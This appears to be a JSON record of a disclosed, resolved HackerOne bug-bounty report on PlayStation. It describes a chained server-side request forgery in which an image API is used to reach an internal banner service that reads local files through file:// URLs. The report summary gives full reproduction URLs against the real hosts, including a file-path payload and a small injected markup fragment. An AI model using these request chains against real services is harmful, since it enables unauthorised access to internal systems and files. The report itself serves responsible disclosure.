@@ -1,0 +1,149 @@
+{
+  "id": 826097,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjYwOTc=",
+  "url": "https://hackerone.com/reports/826097",
+  "title": "SSRF chained to hit internal host leading to another SSRF which allows to read internal images.",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-03-21T19:34:48.522Z",
+  "submitted_at": "2020-03-21T19:34:48.522Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bugdiscloseguys",
+    "url": "/bugdiscloseguys",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/xVUwqLPZMRzBgybFxVY3ec6o/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 44879,
+    "url": "https://hackerone.com/playstation",
+    "handle": "playstation",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/8uyqZE6d69UGEYq8qwzS4Z3Q/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "PlayStation",
+      "twitter_handle": "PlayStation",
+      "website": "https://www.playstation.com",
+      "about": "Recognized as a global leader in interactive and digital entertainment, Sony Interactive Entertainment (SIE) is responsible for the PlayStation brand."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-03-30T04:17:19.052Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-01-12T04:50:09.942Z",
+  "team_member_agreed_on_going_public_at": "2021-03-30T04:17:18.885Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "bounty_amount": "1000.0",
+  "formatted_bounty": "$1,000",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 144,
+  "voters": [
+    "lizardman",
+    "bigmac4life",
+    "rootz491",
+    "pretorian",
+    "scarecow",
+    "az3z3l",
+    "orange303",
+    "riflon",
+    "adzy2k6",
+    "arist0phanes",
+    "and 134 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 40728,
+    "asset_type": "URL",
+    "asset_identifier": "*.playstation.net",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 34837,
+      "category": "team",
+      "content": "## Report Summary:\n\nWe found an SSRF at https://image.api.np.km.playstation.net/ \n\nVulnerable endpoints: `/images` , `/dis/images`. using image GET parameter.\n\n##Description\n\nThis endpoint allows us to fetch a remote image over HTTP protocol using the `image` GET parameter and convert them to the desired format using the GET parameter `format`.\n\nWe found that this could hit internal hosts however the response needs to be a valid image and also `file` protocol isn't working here.\n\nFor example :\n\nThe host https://store.mgmt.playstation.com/ (**mgmt** keywords hosts are meant to be internal for PSN) will respond with a 403 however I found it hosts an image that can open using this SSRF. \n\nhttps://store.mgmt.playstation.com/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image?_version=00_09_000&platform=chihiro&w=225&h=225&bg_color=000000&opacity=100  \n\nThis will give you a 403.\n\n**Using SSRF to open this URL:** https://image.api.np.km.playstation.net/images/?format=png&image=https%3a//store.mgmt.playstation.com/store/api/chihiro/00_09_000/container/US/en/999/UP4134-CUSA00329_00-ONNTGAME00000001/1429722215000/image%3f_version%3d00_09_000%26platform%3dchihiro%26w%3d225%26h%3d225%26bg_color%3d000000%26opacity%3d100\n\n##Taking it further and finding another SSRF to extract internal images using `file` protocol.\n\nWe found an internal host of PSN which serves remote images with our given text (PhantomJs) on the further analysis we found this service could make use of `file` protocol as well and hence we could extract internal images as PoC. \n\nHost :  https://dis.api.np.playstation.net/dis/v1/banners?backplate=https://homer.dl.playstation.net/pr/bam-art/272/352/44592b67-85ac-41d6-b310-334363c5ea58.jpg&dimensions=790x250&price=$36.99&price_discount=$24.41&format[]=PS4&type=Full Game&locale=en_CA&cta=Download Now!&output=png&tpl=banner-web-store&store=game&region=us&\n\nOpening the above URL will result in a timeout.\n\nWe use our SSRF to hit on this host and abuse the other SSRF to read internal files/images.\n\nhttps://image.api.np.km.playstation.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.playstation.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3e%3c%73%3eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26\n\n\n**Flow is:**\n\nimage.api.np.km.playstation.net -> dis.api.np.playstation.net -> fetches the local image using `file://`-> adds given data on image -> image served on (dis.api.np.playstation.net) -> images served to us (using image.api.np.km.playstation.net)\n\n##Steps to reproduce:\n\n- Open https://image.api.np.km.playstation.net/dis/images/?format=png&image=https%3A%2F%2Fdis.api.np.playstation.net%2Fdis%2Fv1%2Fbanners%3Fbackplate%3Dfile:////usr/share/pixmaps/system-logo-white.png%26dimensions%3D790x250%26price%3D%2436.99%26price_discount%3D%2424.41%26format%5B%5D%3DPS4%26type%3DF%22%3e%3c%73%3eull+Game%26locale%3Den_CA%26cta%3DDownload+No%26output%3Dsvg%26tpl%3Dbanner-web-store%26store%3Dgame%26region%3Dus%26\n\nTo open `file:////usr/share/pixmaps/system-logo-white.png` on `dis.api.np.playstation.net` host using `image.api.np.km.playstation.net`.   \n\n\n## Impact\n\nSSRF to local images read using `file:///`.",
+      "updated_at": "2021-03-30T04:16:48.549Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 319901,
+        "username": "serv",
+        "name": "s",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-07-30T18:21:23.048Z",
+        "url": "https://hackerone.com/serv",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/obdkgpjb63bss7ni534fyptzklcx/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
